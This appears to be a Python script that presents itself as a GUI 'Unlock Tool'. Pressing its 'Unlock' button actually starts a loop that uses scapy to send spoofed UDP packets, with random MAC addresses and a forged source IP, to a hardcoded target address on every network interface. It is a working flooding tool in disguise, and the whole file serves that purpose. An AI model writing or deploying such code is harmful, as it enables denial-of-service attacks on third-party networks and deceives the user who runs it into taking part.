import tkinter as tk
import time
import threading
import random
from scapy.all import *

TARGET_IP = "108.109.100.255"
SOURCE_IP = "119.118.3.1"
SOURCE_PORT = 7236
DEST_PORT = 34543
INTERVAL = 0.1

def get_random_mac():
    mac = [random.randint(0x00, 0xff) for _ in range(6)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def send_udp_packets():
    # 创建UDP数据包
    src_mac = get_random_mac()
    packet = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') / \
             IP(src=SOURCE_IP, dst=TARGET_IP) / \
             UDP(sport=SOURCE_PORT, dport=DEST_PORT) / \
             Raw(load=b'\x00' * 64)
    
    # 获取所有网络接口并发送
    interfaces = get_if_list()
    for iface in interfaces:
        try:
            sendp(packet, iface=iface, verbose=False)
        except:
            pass  # 忽略无法使用的接口

class UDPFloodApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Unlock Tool")
        self.root.geometry("300x150")
        self.root.resizable(False, False)
        self.running = False
        self.threads = []

        self.label = tk.Label(root, text="Click to Unlock", font=("Arial", 14))
        self.label.pack(pady=20)

        self.btn = tk.Button(root, text="Unlock", font=("Arial", 12), command=self.toggle)
        self.btn.pack(pady=10)

    def toggle(self):
        if not self.running:
            self.running = True
            self.btn.config(text="Stop")
            self.start_flood()
        else:
            self.running = False
            self.btn.config(text="Unlock")
            for t in self.threads:
                t.join()

    def start_flood(self):
        def flood():
            while self.running:
                send_udp_packets()
                time.sleep(INTERVAL)

        t = threading.Thread(target=flood, daemon=True)
        self.threads.append(t)
        t.start()

if __name__ == "__main__":
    root = tk.Tk()
    app = UDPFloodApp(root)
    root.mainloop()
